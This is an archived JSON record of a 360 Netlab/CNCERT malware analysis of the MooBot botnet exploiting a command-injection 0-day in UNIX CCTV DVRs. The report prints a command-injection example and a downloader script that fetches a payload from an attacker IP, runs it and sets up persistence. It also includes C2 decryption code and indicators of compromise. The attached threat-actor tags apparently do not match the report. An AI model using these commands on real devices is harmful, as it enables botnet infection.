{
    "id": "7afa9ac5-217e-4378-a83c-370a4ebeac70",
    "created_at": "2023-01-12T15:05:27.555465Z",
    "updated_at": "2025-03-27T02:14:39.050556Z",
    "deleted_at": null,
    "sha1_hash": "220ddcf6b33d2ea4c8c80d4582345d2bc90501e6",
    "title": "2020-11-20 - MooBot on the run using another 0 day targeting UNIX CCTV DVR",
    "authors": "",
    "file_creation_date": "2022-05-29T01:20:54Z",
    "file_modification_date": "2022-05-29T01:20:54Z",
    "file_size": 1129253,
    "plain_text": "# MooBot on the run using another 0 day targeting UNIX CCTV DVR\n\n**blog.netlab.360.com/moobot-0day-unixcctv-dvr-en/**\n\nHui Wang November 20, 2020\n\n20 November 2020 / [0-day](https://blog.netlab.360.com/tag/0-day/)\nThis report is jointly issued by CNCERT and Qihoo 360\n\n## Overview\n\n[Moobot is a botnet we first reported in September 2019[1]. It has been pretty active since its](https://blog.netlab.360.com/the-botnet-cluster-on-185-244-25-0-24-en/)\n[appearance and we reported before it has the ability to exploit 0day vulnerabilities[2][3] .](https://blog.netlab.360.com/ddos-botnet-moobot-en/)\n\nIn Jun, we were able to confirm that another 0day had been used by Moobot targeting UNIX\nCCTV DVR/NVR devices(see below for device list). We notified the manufacture and patch\n[has been issued[ALL265 unix 2.3.7.8B09][NVR unix 2.3.7.8B05][ALL unixip 2.3.4.8B06].](http://download.eyemaxdvr.com/TVST%20PVT%205N-SERIES/Patch/)\n\n## Timeline\n\n2020-06-09 We saw the scans targeting the vulnerability\n2020-06-24 A Moobot sample spread by exploiting this vulnerability was captured by us\n2020-08-24 Manufacturers released patches\n\n## Vulnerability exploitation process\n\nMoobot scans port 8000 through Loader, after locating the right target device, Moobot\nsamples will be dropped via the vulnerabilities.\n\n## Vulnerability analysis\n\n**Vulnerability type**\n\nRemote command injection vulnerability\n\n**Vulnerability details**\n\nOn the vulnerable devices, a `gui process runs and listens to port 8000. According to the`\ndevice manual, we know that this port is the default listening port for DVR Watch, Search,\nand Setup functions.\n\n\n-----\n\nThe port has the function of remotely updating the system time, which is actually\nimplemented by the `gui process calling system commands` `nptdate . This is where the`\nproblem is. When the `gui program executes the` `ntpdate command, the NTP server`\nparameters are not checked, resulting in a command injection vulnerability.\n\nFor example, the command ( `ntpdate -d -t 1 time.nist.gov& whoami ) will lead the`\nexecution of `whoami command. Part of the payload is as follows, we will not share more`\ndetails or PoC here due to security concern.\n\n## Affected equipment analysis\n\nBy scanning the 8000 ports of the entire network, we found about 6k online devices. Most of\nthe equipment is in the United States.\n\n\n-----\n\n**Geographical distribution of affected equipment**\n```\n  4529 United_States\n  789 Republic_of_Korea\n   84 Canada\n   73 Japan\n   66 Netherlands\n   56 Australia\n   55 Germany\n   31 United_Kingdom\n   23 Viet_Nam\n   19 Malaysia\n   15 Saudi_Arabia\n   15 Czech\n   14 Switzerland\n   11 China\n\n```\n**Known affected devices:**\n```\n   51 PVT-N5UNIXDVR 1\n   28 PVT-8MUNIXDVR 1\n   28 NVST-ILUNIXDVR 1\n   25 NVST-ILUNIXNVR 1\n   22 Magic-U-8M5UNIXDVR 1\n   14 NVST-IPUNIXNVR 1\n   13 NVST-IPUNIXDVR 1\n   9 Magic-T-8M5UNIXDVR 1\n   9 HD-Analog3RDVR 1\n   6 Magic-QXUNIXDVR 1\n   2 Magic-U-8M5UNIXDVR 2\n   1 PVT-8MUNIXDVR\n   1 NVR3RGPardisNVR\n   1 Magic-U-8M5UNIXBoca DVR\n   1 MER-28N16ENEODVR 1\n   1 MER-28N08ENEODVR 1\n\n## Sample analysis\n\n```\nVerdict:Downloader\n\nMD5:af3720d0141d246bd3ede434f7a14dcb\n\nASCII text, with CRLF line terminators\n```\naf3720d0141d246bd3ede434f7a14dcb It is a download script, the content is as follows：\ns=o;cd /cmslite;wget http://205.185.116.68/boot -O-|gzip -d > .\"$s\";chmod +x\n.\"$s\";./.\"$s\" balloon;\necho -e \"echo \\\"Starting logging\\\"\\nklogd\\nsyslogd -O /dvr/message -s\n4000\\n/cmslite/.o balloon;\" > /etc/init.d/S11log\n\n```\n\n-----\n\nIt can be seen that the main function of Downloader is\n\nDownload Moobot sample\nAchieve persistence\n\nIt is worth mentioning that the downloaded Moobot samples are compressed, which to some\nextent affect the security products' detection of samples at the network traffic level.\n\nVerdict:Moobot_leet\n\nMD5:fb96c74e0548bd41621ea0dd98e8b2bb\n\nELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked, stripped\n\nPacker:No\n\nLib:uclibc\n```\nfb96c74e0548bd41621ea0dd98e8b2bb It is a Moobot variant, based on the reuse of\n\n```\nLeetHozer's encryption method, we call it Moobot_leet. Moobot_leet is very similar to Mirai at\nthe host behavior level and has no real highlights, so in this blog we will just talk about its\nencryption method and communication protocol, we see the sample uses Tor Proxy, and a\nlarge number of proxy nodes are embedded, and Tor-C2 is encrypted.\n\n### Encryption method\n\nMoobot_leet divides Tor-C2 into two parts: `prefix (16 bytes) and` `suffix (7 bytes),`\nwhich exist in different positions of the sample. LeetHozer's encryption method is being\nadopted, and the correct Tor-C2 can only be decrypted by combining the two parts.\n\nThe decryption method is as follows:\n\n\n-----\n\n```\nxorkey qE6MGAbI \ndef decode_str(ctxt):\n  for i in range(0,len(xorkey)):\n    plain=\"\"\n    size=len(ctxt)  \n    for idx in range(0, size):\n      ch=ord(ctxt[idx]) \n      ch ^=(ord(xorkey[i]) + idx )\n      plain += chr(ch)\n    ctxt=plain\n  return ctxt  \n\n```\nTake prefix( `0D 02 50 08 10 18 12 06 17 17 61 77 7A 79 6A 97 ) and suffix(` `CC 81`\n```\n88 BB BD B8 DE ) as examples, splicing to get ciphertext( 0D 02 50 08 10 18 12 06 17\n17 61 77 7A 79 6A 97 CC 81 88 BB BD B8 DE ), decryption can get Tor-C2 as\nol6zbnlduigehodu.onion .\n\n```\nThe strange thing is that from the code level ( `random mod 7 ), it can be seen that there`\nshould be 7 Tor-C2, but there are only 3 in the actual sample, which will cause the bot to\naccess the non legit Tor-C2. We guess it may be a method used to disrupt security\nresearchers & to throw false negative to the sandbox IOC automatic extraction system.\n\n### Communication protocol\n\nAn overview of Moobot_leet network traffic is as follows\n\nFirst, establish a connection with the built-in proxy node of the sample, then establish a\nconnection with Tor-C2, and finally use the normal Moobot communication protocol to notify\nC2 it is alive and can receive the attack command issued by C2.\n\n**1. Establish a connection with the proxy, the port is 9050**\n\n\n-----\n\nThe list of hardcode proxy nodes in the sample is as follows:\n\n\n-----\n\n```\n1.26.150.133\n104.45.52.37\n107.21.38.230\n12.11.175.187\n128.199.45.26\n13.50.100.110\n136.243.69.28\n138.68.107.137\n158.69.33.149\n165.22.117.234\n173.212.249.65\n185.242.114.206\n193.29.187.226\n193.70.77.132\n20.188.45.175\n3.8.5.177\n31.6.69.162\n35.153.180.187\n35.158.231.234\n4.21.119.186\n45.137.22.80\n45.14.148.239\n46.101.216.75\n5.138.113.101\n5.252.225.249\n51.11.247.88\n51.15.239.174\n51.75.144.59\n51.77.148.172\n62.149.14.80\n79.130.136.67\n80.241.212.116\n82.146.61.193\n82.230.81.131\n86.177.24.148\n89.163.146.187\n89.217.41.145\n9.43.47.135\n9.43.47.39\n90.93.30.29\n91.228.218.66\n92.222.76.104\n92.29.22.186\n93.104.211.123\n94.100.28.172\n\n```\n**2. Establish a connection with C2 through Tor-Proxy protocol**\n\n\n-----\n\nThe sample hardcode Tor-C2 list is as follows:\n```\nol6zbnlduigehodu.onion：1900\nuajl7qmdquxaramd.onion：554\nnhez3ihtwxwthjkm.onion：21\n\n```\n**3. Communicate with C2 through the Moobot protocol, the specific go live, heartbeat,**\n**and attack packet are as follows**\n\nRegister package\n```\n   msg parsing\n   ---------------------------------------------------------------   33 66 99  -----> hardcoded magic\n   07  -----> group string length\n   62 61 6c 6c 6f 6f 6e -----> group string,here it is\n\"balloon\"\n\n```\nHeartbeat package\n```\n   msg parsing\n   ---------------------------------------------------------------   c7 15 3a fa  -----> random 4 bytes msg\nfrom bot\n   c7 15 3a fa -----> 4 bytes msg\nfrom c2 \n\n```\nThe attack command is similar to mirai\n```\n00000000: 01 00 00 00 3C 01 C2 0F 92 0C 20 02 01 00 05 32 ....<..... ....2\n00000010: 38 30 31 35 02 00 04 31 34 36 30 02 1C      8015...1460..\n\n## Moobot DDoS campaign\n\n```\n\n-----\n\nMoobot s DDoS attacks are active all year round, and our previous article also introduced\n[Moobot's attacks [1] . Here are the DDoS targets launched by Moobot.(we noticed](https://blog.netlab.360.com/moobot/)\n```\nelectrum.hodlister.co has been attacked from this Moobot nonstop for a few months\n\n```\nnow)\n\n## Contact us\n\n[Readers are always welcomed to reach us on twitter or email us to netlab at 360 dot cn.](https://twitter.com/360Netlab)\n\n## IoC\n\n**Tor-C2**\n```\ndjq6cvwigo7l7q62.onion:194\ndl3ochoifo77lsak.onion:1553\nkrjn77m6demafp77.onion:6969\nmvo4y3vr7xuxhwcf.onion:21\nnhez3ihtwxwthjkm.onion:21\nol6zbnlduigehodu.onion:1900\nstmptmmm27tco3oh.onion:115\ntto6kqp6nsto5din.onion:17\nuajl7qmdquxaramd.onion:554\nwsvo6jwd3spsb4us.onion:1900\n\n```\n**Sample MD5**\n\n\n-----\n\n```\n022081bc7f49b4aa5c4b36982390cd97\n05764c4d5ec37575d5fd3efe95cf3458\n260bda811c00dac88b4f5a35e9939760\n30416eae1f1922b28d93be8078b25ba0\n348acf45ccb313f6c5d34ca5f68f5e13\n3e9ae33e0d5c36f7cd5f576233d83f26\n4d785886039cbca5372068377f72da43\n565c0456c7fbb393ec483c648155b119\n655b56b345799f99b614e23128942b92\n7735289d33d14644fea27add188093ea\n7988a73a4b5ccb7ca9b98dc633b8c0c6\nb2c66c2831173b1117467fdabc78241e\nbb27f755238528fc3c6386287a5c74a7\nbff215a95f088672ad13933a1de70861\ncb428a513275b5e969353596deb7383d\ncf3602498c49caa902d87579fd420098\ne24dc070a4d90a7b01389de9f2805b2b\nfe0488ec71ee04ddb47792cae199595b\n\n```\n**Downloader URL**\n```\nhttp[://104.244.78.131/boot\nhttp[://104.244.78.131/fre\nhttp[://107.189.10.28/boot\nhttp[://107.189.10.28/fre\nhttp[://141.164.63.40/boot\nhttp[://141.164.63.40/fre\nhttp[://172.104.105.205/boot\nhttp[://185.216.140.70/fre\nhttp[://185.216.140.70/t\nhttp[://185.39.11.84/fre\nhttp[://89.248.174.166/t\nhttp[://92.223.73.55/fre\nhttp[://ape.run/dtf/b\nhttp[://ape.run/fre\nhttp[://c.uglykr.xyz/fre\nhttp[://kreb.xyz/fre\nhttp[://osrq.xyz/dtf/b\nhttp[://osrq.xyz/fre\n\n```\n**Scanner IP**\n\n\n-----\n\n```\n176.126.175.10 AS47540|EURODC AS         Romania|Romania|Unknown\n176.126.175.8 AS47540|EURODC-AS         Romania|Romania|Unknown\n185.107.80.202 AS43350|NForce_Entertainment_B.V.\nNetherlands|North_Brabant|Steenbergen\n185.107.80.203 AS43350|NForce_Entertainment_B.V.\nNetherlands|North_Brabant|Steenbergen\n185.107.80.34 AS43350|NForce_Entertainment_B.V.\nNetherlands|North_Brabant|Steenbergen\n185.107.80.62 AS43350|NForce_Entertainment_B.V.\nNetherlands|North_Brabant|Steenbergen\n185.39.11.84 AS62355|Network_Dedicated_SAS    Netherlands|North_Holland|Wormer\n212.224.124.178 AS44066|First_Colo_GmbH       Germany|Hesse|Frankfurt\n89.248.174.165 AS202425|IP_Volume_inc       Netherlands|North_Holland|Wormer\n89.248.174.166 AS202425|IP_Volume_inc       Netherlands|North_Holland|Wormer\n89.248.174.203 AS202425|IP_Volume_inc       Netherlands|North_Holland|Wormer\n92.223.73.136 AS199524|G-Core_Labs_S.A.\nRepublic_of_Korea|Seoul|Unknown\n92.223.73.54 AS199524|G-Core_Labs_S.A.\nRepublic_of_Korea|Seoul|Unknown\n92.223.73.55 AS199524|G-Core_Labs_S.A.\nRepublic_of_Korea|Seoul|Unknown\n92.223.73.72 AS199524|G-Core_Labs_S.A.\nRepublic_of_Korea|Seoul|Unknown\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-20 - MooBot on the run using another 0 day targeting UNIX CCTV DVR.pdf"
    ],
    "report_names": [
        "2020-11-20 - MooBot on the run using another 0 day targeting UNIX CCTV DVR.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535927,
    "ts_updated_at": 1743041679,
    "ts_creation_date": 1653787254,
    "ts_modification_date": 1653787254,
    "files": {
        "pdf": "https://archive.orkl.eu/220ddcf6b33d2ea4c8c80d4582345d2bc90501e6.pdf",
        "text": "https://archive.orkl.eu/220ddcf6b33d2ea4c8c80d4582345d2bc90501e6.txt",
        "img": "https://archive.orkl.eu/220ddcf6b33d2ea4c8c80d4582345d2bc90501e6.jpg"
    }
}